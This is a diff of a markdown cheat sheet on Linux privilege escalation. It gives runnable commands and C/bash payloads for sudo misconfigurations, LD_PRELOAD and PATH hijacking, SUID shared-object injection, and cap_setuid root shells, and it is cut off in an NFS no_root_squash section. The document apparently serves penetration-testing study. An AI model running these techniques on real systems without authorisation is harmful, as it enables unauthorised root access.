@@ -1,10 +1,13 @@
 # Linux-Privilege-Escalation
+
 This document contains a list of privilege escalation techniques in Linux and how to harden the system to prevent them.
 
 [Technicques](https://book.hacktricks.xyz/linux-hardening/privilege-escalation) 
 
 ## System Information
-Gaining knowledge of system to exploit
+
+Gaining knowledge of system to exploit.
+
 |Name|Command|Description|
 |---|---|---|
 |OS infor| `(cat /proc/version \|\| uname -a ) 2>/dev/null &#13; cat /etc/os-release 2>/dev/null` |Finding version and searching for exploits|
@@ -17,10 +20,12 @@ Gaining knowledge of system to exploit
 ## Docker Breakout
 
 ## Usefull software
+
 List usefull binaries
 ```sh
 which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
 ```
+
 Check version of the installed packages and services
 ```sh
 dpkg -l #Debian
@@ -41,36 +46,48 @@ rpm -qa #Centos
 ## Users
 
 ## GTFOBins & GTFOArgs
+
 [GTFOBins](https://gtfobins.github.io/)
 
 [GTFOArgs](https://gtfoargs.github.io/)
 
 ## Sudo abuses
+
 List user's privileges or check a specific
+
 ```python
 sudo -l
 ```
 ### NOPASSWD
+
 Sudo configuration might allow a user to execute some command with another user's privileges without knowing the password.
+
 ```python
 $ sudo -l
 User khoadan may run the following commands on test:
     (root) NOPASSWD: /usr/bin/vim
 ```
 ### SETEVN
+
 This flag allows user to set environment variables when running the specified command.
+
 ```python
 User khoadan may run the following commands on test:
     (ALL) SETENV: /opt/scripts/tasks.py
 ```
 **Exploit**
+
 PYTHONPATH is used by Python to determine which directories to look in for modules to import.
+
 ```python
 sudo PYTHONPATH=/dev/mal/ /opt/scripts/tasks.py
 ```
 Also use LD_PRELOAD variable
+
 ### Sudo command without path
+
 When a single command such as ```ls```, ```cat``` have sudo permission. User can exploit it to get root by changing PATH.
+
 ```python
 export PATH=/tmp:$PATH
 #Creat script "ls" in /tmp
@@ -79,7 +96,9 @@ chmod +x /tmp/ls
 sudo ls
 ```
 ### LD_PRELOAD
+
 LD_PRELOAD is an optional Environment Variable that is used to set/load Shared Libraries to a program or script.
+
 **Exploit**
 - Permission to set LD_PRELOAD Environment Variables for a program.
 - ```env_keep += LD_PRELOAD``` set in sudoers file
@@ -102,6 +121,7 @@ sudo LD_PRELOAD=/tmp/exploit.so ls
 ```
 
 ### Reusing Sudo Tokens
+
 (was fixed in ```sudo``` version 1.8.28)
 
 **Requirements**
@@ -117,7 +137,9 @@ sudo -i
 ```
 
 ## SUID
+
 SUID or GUID, when set, allows the process to execute under the specified user or group.
+
 List all binary with suid/guid:
 ```python
 find / -perm -4000 -ls 2>/dev/null
@@ -147,8 +169,11 @@ int main(void) {
     return 0;
 }
 ```
+
 ### SUID Binary – .so injection
+
 Check all system calls made by a SUID (Set User ID) binary can provide insights into its behavior, particularly which files it attempts to access.
+
 ```python
 strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
 ```
@@ -159,7 +184,9 @@ open("/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
 access("/home/user/.config/libcalc.so", R_OK) = -1 ENOENT (No such file or directory)
 ```
 Pay attention to non -existing files in writable directory to perform privileged escalation.
+
 **Exploit**
+
 Code: libcalc.c
 ```python
 #include <stdio.h>
@@ -175,12 +202,15 @@ gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
 ```
 
 ### SUID binary without command path
+
 Check suid binary with strings to see command execute.
+
 ```python
 #-rwsr-sr-x    root    root    /home/check
 strings /home/check
 #service start nginx
 ```
+
 **Exploit**
 ```python
 echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
@@ -189,13 +219,17 @@ export PATH=/tmp:$PATH
 /home/check
 ```
 ### SUID binary with command path
+
 Check suid binary with strings to see command execute.
+
 ```python
 #-rwsr-sr-x    root    root    /home/check
 strings /home/check
 # /usr/sbin/service start nginx
 ```
-**Exploit** (only work with old linux version)
+
+**Exploit** 
+(only work with old linux version)
 ```python
 function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
 export -f /usr/sbin/service
@@ -208,11 +242,14 @@ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash &&
 ## Shared Object Hijacking
 
 ## Capabilities
+
 File capabilities are a more fine-grained approach to granting specific privileges to executables than the traditional SUID (Set User ID) bit. The cap_setuid capability, for instance, allows a process to change its user ID, which is traditionally the function of SUID-root programs.
+
 ```python
 getcap -r 2>/dev/null| grep cap_setuid
 #/usr/bin/python2.6 = cap_setuid+ep
 ```
+
 **Exploit**
 ```python
 /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
@@ -221,7 +258,9 @@ getcap -r 2>/dev/null| grep cap_setuid
 ## ACLs
 
 ## NFS no_root_squash/no_all_squash misconfiguration PE
+
 This is a misconfiguration in the NFS configuration. If the options no_root_squash or no_all_squash are found in ```/etc/exports```, then you can access it from a client and write inside that directory as if you were the local root of the machine.
+
 ```python
 #Attacker, as root user
 mkdir /tmp/pe
